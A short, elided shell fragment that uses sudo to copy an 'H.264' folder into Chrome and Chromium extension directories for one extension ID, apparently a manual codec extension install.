...
cd /tmp &&
    ...
    sudo cp -R H.264/ .config/google-chrome/Default/Extensions/hoghimnlncdmkafpadmegmcnknngikpo/ &&
    sudo cp -R H.264/ .config/chromium/Default/Extensions/hoghimnlncdmkafpadmegmcnknngikpo/ &&
